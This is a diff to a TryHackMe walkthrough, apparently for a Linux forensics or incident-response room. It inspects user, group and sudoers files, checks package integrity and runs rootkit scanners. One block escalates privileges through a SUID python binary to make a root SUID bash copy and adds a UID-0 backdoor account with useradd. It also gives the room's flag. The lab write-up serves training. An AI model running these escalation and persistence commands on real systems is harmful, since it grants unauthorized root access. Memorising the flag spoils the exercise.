@@ -62,3 +62,63 @@ stat /etc/hosts
 
 ![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/c932c5a8-8201-4f97-8153-983db356c55c)
 
+```
+cat /etc/group
+```
+
+```
+cat /etc/passwd |grep x:0
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/5b5a3ba6-b412-48e3-9ce2-21ed817f10ea)
+
+```
+sudo cat /etc/sudoers
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/5aa67114-4cdc-46f2-b403-e97737e091bb)
+
+```
+sudo debsums -e -s
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/115162cc-4ffd-42a5-9019-b6b421c743f4)
+
+```
+whoami
+groups
+cd ~
+ls -al
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p", "-c", "cp /bin/bash /var/tmp/bash && chown root:root /var/tmp/bash && chmod +s /var/tmp/bash")'
+ls -al /var/tmp
+exit
+useradd -o -u 0 b4ckd00r3d
+exit
+THM{f38279ab9c6af1215815e5f7bbad891b}
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/ac62125e-d2dd-4391-8cea-6a4aff083532)
+
+https://www.chkrootkit.org/
+
+```
+sudo chkrootkit
+```
+
+https://rkhunter.sourceforge.net/
+
+```
+rkhunter --update
+```
+
+```
+sudo rkhunter -c -sk
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/e20debbf-b161-439f-9d1e-2302bceb297f)
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/2fdcd629-a24a-4ab2-9bb2-608aa260b4aa)
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/8aaf4d41-50b0-409a-8a45-50c54d779dcf)
+
